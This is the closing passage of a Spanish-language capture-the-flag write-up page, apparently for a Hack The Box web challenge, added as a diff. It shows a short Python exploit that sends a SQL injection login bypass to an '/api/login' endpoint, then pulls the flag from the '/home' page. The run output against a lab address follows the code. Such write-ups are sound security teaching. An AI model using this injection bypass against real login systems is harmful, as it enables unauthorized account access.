+flag </span><span class="o">= </span><span class="p">pattern.search(request.text).group(</span><span class="mi">0</span><span class="p">)  
+log.success(</span><span class="no">f</span><span class="s">"Flag: </span><span class="p">{flag}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al final nuestro script queda asi y al ejecutarlo hace la petición y nos muestra la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">requests, re, sys
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Uso: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &lthost:port>"</span><span class="p">)  
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+target </span><span class="o">= </span><span class="no">f</span><span class="s">"http://</span><span class="p">{sys.argv[</span><span class="mi">1</span><span class="p">]}</span><span class="s">"</span><span class="s">
+
+session </span><span class="o">= </span><span class="p">requests.Session()
+
+json </span><span class="o">=</span><span class="p"> {</span><span class="s">"username"</span><span class="p">: </span><span class="s">"admin\" or 1=1-- -"</span><span class="p">, </span><span class="s">"password"</span><span class="p">: </span><span class="s">"admin"</span><span class="p">}  
+session.post(target </span><span class="o">+</span><span class="s"> "/api/login"</span><span class="p">, </span><span class="am">json</span><span class="o">=</span><span class="p">json)</span><span class="p">
+
+request </span><span class="o">= </span><span class="p">session.get(target </span><span class="o">+ </span><span class="s">"/home"</span><span class="p">)
+
+pattern </span><span class="o">= </span><span class="p">re.compile(</span><span class="no">r</span><span class="s">"HTB</span><span class="mi">\{</span><span class="p">(</span><span class="mi">.</span><span class="o">+?</span><span class="p">)</span><span class="mi">\}</span><span class="s">"</span><span class="p">)
+flag </span><span class="o">= </span><span class="p">pattern.search(request.text).group(</span><span class="mi">0</span><span class="p">)  
+log.success(</span><span class="no">f</span><span class="s">"Flag: </span><span class="p">{flag}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py 104.248.169.117:30726
+[</span><span class="ve">+</span><span class="p">] Flag: HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}</span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
